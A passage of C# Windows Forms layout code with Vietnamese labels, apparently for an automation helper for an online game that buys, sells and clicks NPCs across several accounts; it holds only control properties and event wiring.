		this.buttonBatdauMua.BackgroundImageLayout = System.Windows.Forms.ImageLayout.None;
		this.buttonBatdauMua.ForeColor = System.Drawing.Color.Black;
		this.buttonBatdauMua.Location = new System.Drawing.Point(3, 74);
		this.buttonBatdauMua.Name = "buttonBatdauMua";
		this.buttonBatdauMua.Size = new System.Drawing.Size(60, 65);
		this.buttonBatdauMua.TabIndex = 350;
		this.buttonBatdauMua.Text = "Mua";
		this.buttonBatdauMua.UseVisualStyleBackColor = false;
		this.buttonBatdauMua.Click += new System.EventHandler(buttonBatdauMua_Click);
		this.buttonStopSudungAll.BackgroundImageLayout = System.Windows.Forms.ImageLayout.None;
		this.buttonStopSudungAll.ForeColor = System.Drawing.Color.Red;
		this.buttonStopSudungAll.Location = new System.Drawing.Point(315, 74);
		this.buttonStopSudungAll.Name = "buttonStopSudungAll";
		this.buttonStopSudungAll.Size = new System.Drawing.Size(60, 65);
		this.buttonStopSudungAll.TabIndex = 349;
		this.buttonStopSudungAll.Text = "Stop ALL";
		this.buttonStopSudungAll.UseVisualStyleBackColor = true;
		this.buttonStopSudungAll.Click += new System.EventHandler(buttonStopSudungAll_Click);
		this.buttonMuaSudungAll.BackColor = System.Drawing.Color.LightSteelBlue;
		this.buttonMuaSudungAll.BackgroundImageLayout = System.Windows.Forms.ImageLayout.None;
		this.buttonMuaSudungAll.ForeColor = System.Drawing.Color.Red;
		this.buttonMuaSudungAll.Location = new System.Drawing.Point(189, 74);
		this.buttonMuaSudungAll.Name = "buttonMuaSudungAll";
		this.buttonMuaSudungAll.Size = new System.Drawing.Size(60, 65);
		this.buttonMuaSudungAll.TabIndex = 348;
		this.buttonMuaSudungAll.Text = "Tất cả";
		this.buttonMuaSudungAll.UseVisualStyleBackColor = false;
		this.buttonMuaSudungAll.Click += new System.EventHandler(buttonMuaSudungAll_Click);
		this.buttonMuaGopAll.BackColor = System.Drawing.Color.DarkSeaGreen;
		this.buttonMuaGopAll.BackgroundImageLayout = System.Windows.Forms.ImageLayout.None;
		this.buttonMuaGopAll.ForeColor = System.Drawing.Color.Red;
		this.buttonMuaGopAll.Location = new System.Drawing.Point(65, 74);
		this.buttonMuaGopAll.Name = "buttonMuaGopAll";
		this.buttonMuaGopAll.Size = new System.Drawing.Size(60, 65);
		this.buttonMuaGopAll.TabIndex = 347;
		this.buttonMuaGopAll.Text = "Tất cả";
		this.buttonMuaGopAll.UseVisualStyleBackColor = false;
		this.buttonMuaGopAll.Click += new System.EventHandler(buttonMuaGopAll_Click);
		this.buttonStopSudung.BackgroundImageLayout = System.Windows.Forms.ImageLayout.None;
		this.buttonStopSudung.ForeColor = System.Drawing.Color.Blue;
		this.buttonStopSudung.Location = new System.Drawing.Point(252, 74);
		this.buttonStopSudung.Name = "buttonStopSudung";
		this.buttonStopSudung.Size = new System.Drawing.Size(60, 65);
		this.buttonStopSudung.TabIndex = 348;
		this.buttonStopSudung.Text = "Stop";
		this.buttonStopSudung.UseVisualStyleBackColor = true;
		this.buttonStopSudung.Click += new System.EventHandler(buttonStopSudung_Click);
		this.textBoxMuadungSoLuong.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.textBoxMuadungSoLuong.ForeColor = System.Drawing.Color.Black;
		this.textBoxMuadungSoLuong.Location = new System.Drawing.Point(209, 32);
		this.textBoxMuadungSoLuong.Name = "textBoxMuadungSoLuong";
		this.textBoxMuadungSoLuong.Size = new System.Drawing.Size(36, 14);
		this.textBoxMuadungSoLuong.TabIndex = 204;
		this.textBoxMuadungSoLuong.Text = "0";
		this.textBoxMuadungSoLuong.TextChanged += new System.EventHandler(textBoxMuadungSoLuong_TextChanged);
		this.textBoxIdMua.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.textBoxIdMua.ForeColor = System.Drawing.Color.Black;
		this.textBoxIdMua.Location = new System.Drawing.Point(207, 53);
		this.textBoxIdMua.Name = "textBoxIdMua";
		this.textBoxIdMua.Size = new System.Drawing.Size(36, 14);
		this.textBoxIdMua.TabIndex = 198;
		this.textBoxIdMua.Text = "0";
		this.textBoxIdMua.TextChanged += new System.EventHandler(textBoxIdMua_TextChanged);
		this.linkLabelPhimCauca.AutoSize = true;
		this.linkLabelPhimCauca.Location = new System.Drawing.Point(277, 50);
		this.linkLabelPhimCauca.Name = "linkLabelPhimCauca";
		this.linkLabelPhimCauca.Size = new System.Drawing.Size(101, 15);
		this.linkLabelPhimCauca.TabIndex = 208;
		this.linkLabelPhimCauca.TabStop = true;
		this.linkLabelPhimCauca.Text = "xem phim câu cá";
		this.linkLabelPhimCauca.LinkClicked += new System.Windows.Forms.LinkLabelLinkClickedEventHandler(linkLabelPhimCauca_LinkClicked);
		this.checkBoxThanhTruotSudung.AutoSize = true;
		this.checkBoxThanhTruotSudung.ForeColor = System.Drawing.Color.Black;
		this.checkBoxThanhTruotSudung.Location = new System.Drawing.Point(4, 51);
		this.checkBoxThanhTruotSudung.Name = "checkBoxThanhTruotSudung";
		this.checkBoxThanhTruotSudung.Size = new System.Drawing.Size(185, 19);
		this.checkBoxThanhTruotSudung.TabIndex = 207;
		this.checkBoxThanhTruotSudung.Text = "Khi sử dụng có thanh trượt =>";
		this.checkBoxThanhTruotSudung.UseVisualStyleBackColor = true;
		this.checkBoxThanhTruotSudung.CheckedChanged += new System.EventHandler(checkBoxThanhTruotSudung_CheckedChanged);
		this.buttonHelpMua.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f);
		this.buttonHelpMua.ForeColor = System.Drawing.Color.MediumBlue;
		this.buttonHelpMua.Location = new System.Drawing.Point(246, 50);
		this.buttonHelpMua.Name = "buttonHelpMua";
		this.buttonHelpMua.Size = new System.Drawing.Size(32, 21);
		this.buttonHelpMua.TabIndex = 198;
		this.buttonHelpMua.Text = "H.dẫn";
		this.buttonHelpMua.UseVisualStyleBackColor = true;
		this.buttonHelpMua.Click += new System.EventHandler(buttonHelpMua_Click);
		this.checkBoxBoquaMaKTC.AutoSize = true;
		this.checkBoxBoquaMaKTC.ForeColor = System.Drawing.Color.Black;
		this.checkBoxBoquaMaKTC.Location = new System.Drawing.Point(254, 30);
		this.checkBoxBoquaMaKTC.Name = "checkBoxBoquaMaKTC";
		this.checkBoxBoquaMaKTC.Size = new System.Drawing.Size(143, 19);
		this.checkBoxBoquaMaKTC.TabIndex = 205;
		this.checkBoxBoquaMaKTC.Text = "Bỏ qua nhập mã KTC";
		this.checkBoxBoquaMaKTC.UseVisualStyleBackColor = true;
		this.checkBoxBoquaMaKTC.CheckedChanged += new System.EventHandler(checkBoxBoquaMaKTC_CheckedChanged);
		this.checkBoxMuaDungSoluong.AutoSize = true;
		this.checkBoxMuaDungSoluong.ForeColor = System.Drawing.Color.Black;
		this.checkBoxMuaDungSoluong.Location = new System.Drawing.Point(89, 31);
		this.checkBoxMuaDungSoluong.Name = "checkBoxMuaDungSoluong";
		this.checkBoxMuaDungSoluong.Size = new System.Drawing.Size(125, 19);
		this.checkBoxMuaDungSoluong.TabIndex = 203;
		this.checkBoxMuaDungSoluong.Text = "Nhập Số lượng =>";
		this.checkBoxMuaDungSoluong.UseVisualStyleBackColor = true;
		this.checkBoxMuaDungSoluong.CheckedChanged += new System.EventHandler(checkBoxMuaDungSoluong_CheckedChanged);
		this.comboBoxMuaVatpham.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.comboBoxMuaVatpham.DropDownWidth = 180;
		this.comboBoxMuaVatpham.ForeColor = System.Drawing.Color.Black;
		this.comboBoxMuaVatpham.FormattingEnabled = true;
		this.comboBoxMuaVatpham.Location = new System.Drawing.Point(107, 3);
		this.comboBoxMuaVatpham.Name = "comboBoxMuaVatpham";
		this.comboBoxMuaVatpham.Size = new System.Drawing.Size(141, 23);
		this.comboBoxMuaVatpham.TabIndex = 190;
		this.comboBoxMuaVatpham.SelectedIndexChanged += new System.EventHandler(comboBoxMuaVatpham_SelectedIndexChanged);
		this.comboBoxMuaVatpham.MouseDown += new System.Windows.Forms.MouseEventHandler(comboBoxMuaVatpham_MouseDown);
		this.label16.AutoSize = true;
		this.label16.ForeColor = System.Drawing.Color.DarkRed;
		this.label16.Location = new System.Drawing.Point(1, 7);
		this.label16.Name = "label16";
		this.label16.Size = new System.Drawing.Size(108, 15);
		this.label16.TabIndex = 191;
		this.label16.Text = "Chọn Vật phẩm =>";
		this.checkBoxGopVatpham.AutoSize = true;
		this.checkBoxGopVatpham.ForeColor = System.Drawing.Color.DarkRed;
		this.checkBoxGopVatpham.Location = new System.Drawing.Point(4, 29);
		this.checkBoxGopVatpham.Name = "checkBoxGopVatpham";
		this.checkBoxGopVatpham.Size = new System.Drawing.Size(90, 19);
		this.checkBoxGopVatpham.TabIndex = 193;
		this.checkBoxGopVatpham.Text = "Mua và gộp";
		this.checkBoxGopVatpham.UseVisualStyleBackColor = true;
		this.checkBoxGopVatpham.CheckedChanged += new System.EventHandler(checkBoxGopVatpham_CheckedChanged);
		this.checkBoxMuaKytrancac.AutoSize = true;
		this.checkBoxMuaKytrancac.ForeColor = System.Drawing.Color.DarkRed;
		this.checkBoxMuaKytrancac.Location = new System.Drawing.Point(255, 6);
		this.checkBoxMuaKytrancac.Name = "checkBoxMuaKytrancac";
		this.checkBoxMuaKytrancac.Size = new System.Drawing.Size(123, 19);
		this.checkBoxMuaKytrancac.TabIndex = 194;
		this.checkBoxMuaKytrancac.Text = "Mua ở Kỳ trân các";
		this.checkBoxMuaKytrancac.UseVisualStyleBackColor = true;
		this.checkBoxMuaKytrancac.CheckedChanged += new System.EventHandler(checkBoxMuaKytrancac_CheckedChanged);
		this.tabPage15.Controls.Add(this.label21);
		this.tabPage15.Controls.Add(this.buttonDsBanVatpham);
		this.tabPage15.Controls.Add(this.buttonTatCaBanVatPhamRac);
		this.tabPage15.Controls.Add(this.label7);
		this.tabPage15.Controls.Add(this.buttonBanVatphamRac);
		this.tabPage15.Controls.Add(this.comboBoxBanVatPham);
		this.tabPage15.Controls.Add(this.checkBoxBanVpham);
		this.tabPage15.Location = new System.Drawing.Point(4, 24);
		this.tabPage15.Name = "tabPage15";
		this.tabPage15.Padding = new System.Windows.Forms.Padding(3);
		this.tabPage15.Size = new System.Drawing.Size(379, 156);
		this.tabPage15.TabIndex = 3;
		this.tabPage15.Text = "Bán";
		this.tabPage15.UseVisualStyleBackColor = true;
		this.label21.ForeColor = System.Drawing.Color.Orange;
		this.label21.Location = new System.Drawing.Point(7, 125);
		this.label21.Name = "label21";
		this.label21.Size = new System.Drawing.Size(369, 13);
		this.label21.TabIndex = 355;
		this.label21.Text = "( nếu không dùng thì nên bỏ check để nhẹ game)";
		this.buttonDsBanVatpham.ForeColor = System.Drawing.Color.DarkGreen;
		this.buttonDsBanVatpham.Location = new System.Drawing.Point(257, 4);
		this.buttonDsBanVatpham.Name = "buttonDsBanVatpham";
		this.buttonDsBanVatpham.Size = new System.Drawing.Size(120, 38);
		this.buttonDsBanVatpham.TabIndex = 347;
		this.buttonDsBanVatpham.Text = "Danh sách vật phẩm";
		this.buttonDsBanVatpham.UseVisualStyleBackColor = true;
		this.buttonDsBanVatpham.Click += new System.EventHandler(buttonDsBanVatpham_Click);
		this.buttonTatCaBanVatPhamRac.ForeColor = System.Drawing.Color.DarkRed;
		this.buttonTatCaBanVatPhamRac.Location = new System.Drawing.Point(199, 47);
		this.buttonTatCaBanVatPhamRac.Name = "buttonTatCaBanVatPhamRac";
		this.buttonTatCaBanVatPhamRac.Size = new System.Drawing.Size(178, 40);
		this.buttonTatCaBanVatPhamRac.TabIndex = 351;
		this.buttonTatCaBanVatPhamRac.Text = "Tất cả ac đều thực hiện";
		this.buttonTatCaBanVatPhamRac.UseVisualStyleBackColor = true;
		this.buttonTatCaBanVatPhamRac.Click += new System.EventHandler(buttonTatCaBanVatPhamRac_Click);
		this.label7.AutoSize = true;
		this.label7.Location = new System.Drawing.Point(3, 15);
		this.label7.Name = "label7";
		this.label7.Size = new System.Drawing.Size(131, 15);
		this.label7.TabIndex = 354;
		this.label7.Text = "Tùy chọn Cách xử lý =>";
		this.buttonBanVatphamRac.ForeColor = System.Drawing.Color.Black;
		this.buttonBanVatphamRac.Location = new System.Drawing.Point(6, 47);
		this.buttonBanVatphamRac.Name = "buttonBanVatphamRac";
		this.buttonBanVatphamRac.Size = new System.Drawing.Size(186, 40);
		this.buttonBanVatphamRac.TabIndex = 350;
		this.buttonBanVatphamRac.Text = "Bán hoặc sử dụng";
		this.buttonBanVatphamRac.UseVisualStyleBackColor = true;
		this.buttonBanVatphamRac.Click += new System.EventHandler(buttonBanVatphamRac_Click);
		this.comboBoxBanVatPham.FormattingEnabled = true;
		this.comboBoxBanVatPham.Location = new System.Drawing.Point(137, 12);
		this.comboBoxBanVatPham.Name = "comboBoxBanVatPham";
		this.comboBoxBanVatPham.Size = new System.Drawing.Size(116, 23);
		this.comboBoxBanVatPham.TabIndex = 353;
		this.comboBoxBanVatPham.SelectedIndexChanged += new System.EventHandler(comboBoxBanVatPham_SelectedIndexChanged);
		this.checkBoxBanVpham.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.checkBoxBanVpham.Location = new System.Drawing.Point(3, 89);
		this.checkBoxBanVpham.Name = "checkBoxBanVpham";
		this.checkBoxBanVpham.Size = new System.Drawing.Size(370, 34);
		this.checkBoxBanVpham.TabIndex = 349;
		this.checkBoxBanVpham.Text = "Tự động bán hoặc sử dụng vật phẩm có trong danh sách mỗi khi xuất hiện";
		this.checkBoxBanVpham.UseVisualStyleBackColor = true;
		this.checkBoxBanVpham.CheckedChanged += new System.EventHandler(checkBoxBanVpham_CheckedChanged);
		this.tabPage12.Controls.Add(this.checkBoxVSTDong2);
		this.tabPage12.Controls.Add(this.textBoxTenacTimVST);
		this.tabPage12.Controls.Add(this.textBoxThoigianVST);
		this.tabPage12.Controls.Add(this.buttonCopyVST);
		this.tabPage12.Controls.Add(this.checkBoxBaokenhbang);
		this.tabPage12.Controls.Add(this.checkBoxBatdauVanSuthong);
		this.tabPage12.Controls.Add(this.textBoxToadoVST);
		this.tabPage12.Controls.Add(this.label3);
		this.tabPage12.Controls.Add(this.checkBoxRoom);
		this.tabPage12.Controls.Add(this.textBoxMapNameVST);
		this.tabPage12.Controls.Add(this.label9);
		this.tabPage12.Controls.Add(this.buttonPasteVST);
		this.tabPage12.Controls.Add(this.label38);
		this.tabPage12.Location = new System.Drawing.Point(4, 24);
		this.tabPage12.Name = "tabPage12";
		this.tabPage12.Padding = new System.Windows.Forms.Padding(3);
		this.tabPage12.Size = new System.Drawing.Size(379, 156);
		this.tabPage12.TabIndex = 5;
		this.tabPage12.Text = "VSThông";
		this.tabPage12.UseVisualStyleBackColor = true;
		this.checkBoxVSTDong2.AutoSize = true;
		this.checkBoxVSTDong2.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f);
		this.checkBoxVSTDong2.Location = new System.Drawing.Point(3, 62);
		this.checkBoxVSTDong2.Name = "checkBoxVSTDong2";
		this.checkBoxVSTDong2.Size = new System.Drawing.Size(104, 17);
		this.checkBoxVSTDong2.TabIndex = 216;
		this.checkBoxVSTDong2.Text = "Đối thoại dòng 2";
		this.checkBoxVSTDong2.UseVisualStyleBackColor = true;
		this.checkBoxVSTDong2.CheckedChanged += new System.EventHandler(checkBoxVSTDong2_CheckedChanged);
		this.textBoxTenacTimVST.ForeColor = System.Drawing.Color.Black;
		this.textBoxTenacTimVST.Location = new System.Drawing.Point(254, 6);
		this.textBoxTenacTimVST.Name = "textBoxTenacTimVST";
		this.textBoxTenacTimVST.Size = new System.Drawing.Size(125, 21);
		this.textBoxTenacTimVST.TabIndex = 195;
		this.textBoxTenacTimVST.TextChanged += new System.EventHandler(textBoxTenacTimVST_TextChanged);
		this.textBoxThoigianVST.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.textBoxThoigianVST.Location = new System.Drawing.Point(147, 43);
		this.textBoxThoigianVST.Name = "textBoxThoigianVST";
		this.textBoxThoigianVST.Size = new System.Drawing.Size(31, 14);
		this.textBoxThoigianVST.TabIndex = 198;
		this.textBoxThoigianVST.TextChanged += new System.EventHandler(textBoxThoigianVST_TextChanged);
		this.buttonCopyVST.Location = new System.Drawing.Point(244, 105);
		this.buttonCopyVST.Name = "buttonCopyVST";
		this.buttonCopyVST.Size = new System.Drawing.Size(129, 30);
		this.buttonCopyVST.TabIndex = 209;
		this.buttonCopyVST.Text = "Copy";
		this.buttonCopyVST.UseVisualStyleBackColor = true;
		this.buttonCopyVST.Click += new System.EventHandler(buttonCopyVST_Click);
		this.checkBoxBaokenhbang.AutoSize = true;
		this.checkBoxBaokenhbang.Location = new System.Drawing.Point(115, 62);
		this.checkBoxBaokenhbang.Name = "checkBoxBaokenhbang";
		this.checkBoxBaokenhbang.Size = new System.Drawing.Size(109, 19);
		this.checkBoxBaokenhbang.TabIndex = 204;
		this.checkBoxBaokenhbang.Text = "Báo kênh bang";
		this.checkBoxBaokenhbang.UseVisualStyleBackColor = true;
		this.checkBoxBaokenhbang.CheckedChanged += new System.EventHandler(checkBoxBaokenhbang_CheckedChanged);
		this.checkBoxBatdauVanSuthong.AutoSize = true;
		this.checkBoxBatdauVanSuthong.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.checkBoxBatdauVanSuthong.ForeColor = System.Drawing.Color.DarkBlue;
		this.checkBoxBatdauVanSuthong.Location = new System.Drawing.Point(3, 86);
		this.checkBoxBatdauVanSuthong.Name = "checkBoxBatdauVanSuthong";
		this.checkBoxBatdauVanSuthong.Size = new System.Drawing.Size(102, 17);
		this.checkBoxBatdauVanSuthong.TabIndex = 213;
		this.checkBoxBatdauVanSuthong.Text = "Bắt đầu chạy";
		this.checkBoxBatdauVanSuthong.UseVisualStyleBackColor = true;
		this.checkBoxBatdauVanSuthong.CheckedChanged += new System.EventHandler(checkBoxBatdauVanSuthong_CheckedChanged);
		this.textBoxToadoVST.BackColor = System.Drawing.SystemColors.Info;
		this.textBoxToadoVST.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.textBoxToadoVST.ForeColor = System.Drawing.Color.Black;
		this.textBoxToadoVST.Location = new System.Drawing.Point(100, 116);
		this.textBoxToadoVST.Name = "textBoxToadoVST";
		this.textBoxToadoVST.ReadOnly = true;
		this.textBoxToadoVST.Size = new System.Drawing.Size(133, 14);
		this.textBoxToadoVST.TabIndex = 208;
		this.label3.AutoSize = true;
		this.label3.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f);
		this.label3.Location = new System.Drawing.Point(-1, 45);
		this.label3.Name = "label3";
		this.label3.Size = new System.Drawing.Size(144, 13);
		this.label3.TabIndex = 214;
		this.label3.Text = "Thời gian giữa 2 lần tìm (giây)";
		this.checkBoxRoom.AutoSize = true;
		this.checkBoxRoom.Location = new System.Drawing.Point(115, 85);
		this.checkBoxRoom.Name = "checkBoxRoom";
		this.checkBoxRoom.Size = new System.Drawing.Size(87, 19);
		this.checkBoxRoom.TabIndex = 211;
		this.checkBoxRoom.Text = "Kênh room";
		this.checkBoxRoom.UseVisualStyleBackColor = true;
		this.checkBoxRoom.CheckedChanged += new System.EventHandler(checkBoxRoom_CheckedChanged);
		this.textBoxMapNameVST.BackColor = System.Drawing.SystemColors.Window;
		this.textBoxMapNameVST.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.textBoxMapNameVST.ForeColor = System.Drawing.Color.Black;
		this.textBoxMapNameVST.Location = new System.Drawing.Point(116, 116);
		this.textBoxMapNameVST.Name = "textBoxMapNameVST";
		this.textBoxMapNameVST.ReadOnly = true;
		this.textBoxMapNameVST.Size = new System.Drawing.Size(133, 14);
		this.textBoxMapNameVST.TabIndex = 210;
		this.label9.AutoSize = true;
		this.label9.BackColor = System.Drawing.Color.Gainsboro;
		this.label9.ForeColor = System.Drawing.Color.Red;
		this.label9.Location = new System.Drawing.Point(6, 116);
		this.label9.Name = "label9";
		this.label9.Size = new System.Drawing.Size(86, 15);
		this.label9.TabIndex = 215;
		this.label9.Text = "Kết quả dò tìm";
		this.buttonPasteVST.Location = new System.Drawing.Point(254, 32);
		this.buttonPasteVST.Name = "buttonPasteVST";
		this.buttonPasteVST.Size = new System.Drawing.Size(119, 21);
		this.buttonPasteVST.TabIndex = 206;
		this.buttonPasteVST.Text = "Dán";
		this.buttonPasteVST.UseVisualStyleBackColor = true;
		this.buttonPasteVST.Click += new System.EventHandler(buttonPasteVST_Click);
		this.label38.Location = new System.Drawing.Point(3, 6);
		this.label38.Name = "label38";
		this.label38.Size = new System.Drawing.Size(246, 34);
		this.label38.TabIndex = 197;
		this.label38.Text = "Chạy về Vạn Sự Thông ở Nam Nhạc Trấn , sau đó copy tên acc dán vô ô ==>";
		this.checkBoxXoaMn.AutoSize = true;
		this.checkBoxXoaMn.Location = new System.Drawing.Point(7, 60);
		this.checkBoxXoaMn.Name = "checkBoxXoaMn";
		this.checkBoxXoaMn.Size = new System.Drawing.Size(186, 19);
		this.checkBoxXoaMn.TabIndex = 348;
		this.checkBoxXoaMn.Text = "Time lặp lại sau khi click  ==>";
		this.checkBoxXoaMn.UseVisualStyleBackColor = true;
		this.checkBoxXoaMn.CheckedChanged += new System.EventHandler(checkBoxXoaMn_CheckedChanged);
		this.buttonNpcClickMenu.ForeColor = System.Drawing.Color.DarkGreen;
		this.buttonNpcClickMenu.Location = new System.Drawing.Point(101, 35);
		this.buttonNpcClickMenu.Name = "buttonNpcClickMenu";
		this.buttonNpcClickMenu.Size = new System.Drawing.Size(85, 23);
		this.buttonNpcClickMenu.TabIndex = 343;
		this.buttonNpcClickMenu.Text = "click dòng =>";
		this.buttonNpcClickMenu.UseVisualStyleBackColor = true;
		this.buttonNpcClickMenu.Click += new System.EventHandler(buttonNpcClickMenu_Click);
		this.checkBoxNhapSLClickNpc.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f);
		this.checkBoxNhapSLClickNpc.Location = new System.Drawing.Point(251, 37);
		this.checkBoxNhapSLClickNpc.Name = "checkBoxNhapSLClickNpc";
		this.checkBoxNhapSLClickNpc.Size = new System.Drawing.Size(101, 19);
		this.checkBoxNhapSLClickNpc.TabIndex = 347;
		this.checkBoxNhapSLClickNpc.Text = "Nhập số lượng";
		this.checkBoxNhapSLClickNpc.UseVisualStyleBackColor = true;
		this.checkBoxNhapSLClickNpc.CheckedChanged += new System.EventHandler(checkBoxNhapSLClickNpc_CheckedChanged);
		this.buttonClickNpcStopAll.BackgroundImageLayout = System.Windows.Forms.ImageLayout.None;
		this.buttonClickNpcStopAll.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f);
		this.buttonClickNpcStopAll.ForeColor = System.Drawing.Color.Black;
		this.buttonClickNpcStopAll.Location = new System.Drawing.Point(174, 80);
		this.buttonClickNpcStopAll.Name = "buttonClickNpcStopAll";
		this.buttonClickNpcStopAll.Size = new System.Drawing.Size(75, 21);
		this.buttonClickNpcStopAll.TabIndex = 346;
		this.buttonClickNpcStopAll.Text = "Tất cả dừng";
		this.buttonClickNpcStopAll.UseVisualStyleBackColor = true;
		this.buttonClickNpcStopAll.Click += new System.EventHandler(buttonClickNpcStopAll_Click);
		this.textBoxNhapSoluongClickNPC.ForeColor = System.Drawing.Color.Black;
		this.textBoxNhapSoluongClickNPC.Location = new System.Drawing.Point(356, 36);
		this.textBoxNhapSoluongClickNPC.Name = "textBoxNhapSoluongClickNPC";
		this.textBoxNhapSoluongClickNPC.Size = new System.Drawing.Size(24, 21);
		this.textBoxNhapSoluongClickNPC.TabIndex = 197;
		this.textBoxNhapSoluongClickNPC.TextChanged += new System.EventHandler(textBoxNhapSoluongClickNPC_TextChanged);
		this.buttonClickNpcAll.BackgroundImageLayout = System.Windows.Forms.ImageLayout.None;
		this.buttonClickNpcAll.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f);
		this.buttonClickNpcAll.ForeColor = System.Drawing.Color.Red;
		this.buttonClickNpcAll.Location = new System.Drawing.Point(93, 80);
		this.buttonClickNpcAll.Name = "buttonClickNpcAll";
		this.buttonClickNpcAll.Size = new System.Drawing.Size(76, 21);
		this.buttonClickNpcAll.TabIndex = 345;
		this.buttonClickNpcAll.Text = "Tất cả chạy";
		this.buttonClickNpcAll.UseVisualStyleBackColor = true;
		this.buttonClickNpcAll.Click += new System.EventHandler(buttonClickNpcAll_Click);
		this.textBoxClickNPCSolan.ForeColor = System.Drawing.Color.Black;
		this.textBoxClickNPCSolan.Location = new System.Drawing.Point(356, 11);
		this.textBoxClickNPCSolan.Name = "textBoxClickNPCSolan";
		this.textBoxClickNPCSolan.Size = new System.Drawing.Size(24, 21);
		this.textBoxClickNPCSolan.TabIndex = 171;
		this.textBoxClickNPCSolan.TextChanged += new System.EventHandler(textBoxClickNPCSolan_TextChanged);
		this.buttonClickNpcSingle.BackgroundImageLayout = System.Windows.Forms.ImageLayout.None;
		this.buttonClickNpcSingle.ForeColor = System.Drawing.Color.Black;
		this.buttonClickNpcSingle.Location = new System.Drawing.Point(7, 80);
		this.buttonClickNpcSingle.Name = "buttonClickNpcSingle";
		this.buttonClickNpcSingle.Size = new System.Drawing.Size(80, 21);
		this.buttonClickNpcSingle.TabIndex = 344;
		this.buttonClickNpcSingle.Text = "Chạy";
		this.buttonClickNpcSingle.UseVisualStyleBackColor = true;
		this.buttonClickNpcSingle.Click += new System.EventHandler(buttonClickNpcSingle_Click);
		this.buttonHelpClickNpc.ForeColor = System.Drawing.Color.MediumBlue;
		this.buttonHelpClickNpc.Location = new System.Drawing.Point(251, 63);
		this.buttonHelpClickNpc.Name = "buttonHelpClickNpc";
		this.buttonHelpClickNpc.Size = new System.Drawing.Size(60, 38);
		this.buttonHelpClickNpc.TabIndex = 215;
		this.buttonHelpClickNpc.Text = "Hướng dẫn";
		this.buttonHelpClickNpc.UseVisualStyleBackColor = true;
		this.buttonHelpClickNpc.Click += new System.EventHandler(buttonHelpClickNpc_Click);
		this.textBoxClickNPCMenu.BackColor = System.Drawing.SystemColors.Info;
		this.textBoxClickNPCMenu.ForeColor = System.Drawing.Color.DarkGreen;
		this.textBoxClickNPCMenu.Location = new System.Drawing.Point(188, 34);
		this.textBoxClickNPCMenu.Name = "textBoxClickNPCMenu";
		this.textBoxClickNPCMenu.Size = new System.Drawing.Size(60, 21);
		this.textBoxClickNPCMenu.TabIndex = 162;
		this.textBoxClickNPCMenu.TextChanged += new System.EventHandler(textBoxClickNPCMenu_TextChanged);
		this.comboBoxClickNPC.DropDownWidth = 150;
		this.comboBoxClickNPC.ForeColor = System.Drawing.Color.Black;
		this.comboBoxClickNPC.FormattingEnabled = true;
		this.comboBoxClickNPC.Location = new System.Drawing.Point(60, 10);
		this.comboBoxClickNPC.Name = "comboBoxClickNPC";
		this.comboBoxClickNPC.Size = new System.Drawing.Size(110, 23);
		this.comboBoxClickNPC.TabIndex = 164;
		this.comboBoxClickNPC.SelectedIndexChanged += new System.EventHandler(comboBoxClickNPC_SelectedIndexChanged);
		this.comboBoxClickNPC.MouseDown += new System.Windows.Forms.MouseEventHandler(comboBoxClickNPC_MouseDown);
		this.textBoxClickNPCTocdo.ForeColor = System.Drawing.Color.Black;
		this.textBoxClickNPCTocdo.Location = new System.Drawing.Point(215, 10);
		this.textBoxClickNPCTocdo.Name = "textBoxClickNPCTocdo";
		this.textBoxClickNPCTocdo.Size = new System.Drawing.Size(32, 21);
		this.textBoxClickNPCTocdo.TabIndex = 173;
		this.textBoxClickNPCTocdo.TextChanged += new System.EventHandler(textBoxClickNPCTocdo_TextChanged);
		this.checkBoxClickNPCmenu.AutoSize = true;
		this.checkBoxClickNPCmenu.BackColor = System.Drawing.SystemColors.Control;
		this.checkBoxClickNPCmenu.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f);
		this.checkBoxClickNPCmenu.Location = new System.Drawing.Point(7, 39);
		this.checkBoxClickNPCmenu.Name = "checkBoxClickNPCmenu";
		this.checkBoxClickNPCmenu.Size = new System.Drawing.Size(93, 17);
		this.checkBoxClickNPCmenu.TabIndex = 165;
		this.checkBoxClickNPCmenu.Text = "Có click menu";
		this.checkBoxClickNPCmenu.UseVisualStyleBackColor = false;
		this.checkBoxClickNPCmenu.CheckedChanged += new System.EventHandler(checkBoxClickNPCmenu_CheckedChanged);
		this.buttonThietlapClickNpc.BackColor = System.Drawing.Color.LightSteelBlue;
		this.buttonThietlapClickNpc.ForeColor = System.Drawing.Color.Black;
		this.buttonThietlapClickNpc.Location = new System.Drawing.Point(312, 62);
		this.buttonThietlapClickNpc.Name = "buttonThietlapClickNpc";
		this.buttonThietlapClickNpc.Size = new System.Drawing.Size(74, 39);
		this.buttonThietlapClickNpc.TabIndex = 193;
		this.buttonThietlapClickNpc.Text = "Lập điều kiện khác";
		this.buttonThietlapClickNpc.UseVisualStyleBackColor = false;
		this.buttonThietlapClickNpc.Click += new System.EventHandler(buttonThietlapClickNpc_Click);
		this.checkBoxNPC.AutoSize = true;
		this.checkBoxNPC.BackColor = System.Drawing.SystemColors.Control;
		this.checkBoxNPC.ForeColor = System.Drawing.Color.Red;
		this.checkBoxNPC.Location = new System.Drawing.Point(7, 15);
		this.checkBoxNPC.Name = "checkBoxNPC";
		this.checkBoxNPC.Size = new System.Drawing.Size(51, 19);
		this.checkBoxNPC.TabIndex = 194;
		this.checkBoxNPC.Text = "NPC";
		this.checkBoxNPC.UseVisualStyleBackColor = false;
		this.checkBoxNPC.CheckedChanged += new System.EventHandler(checkBoxNPC_CheckedChanged);
		this.label2.AutoSize = true;
		this.label2.Location = new System.Drawing.Point(172, 16);
		this.label2.Name = "label2";
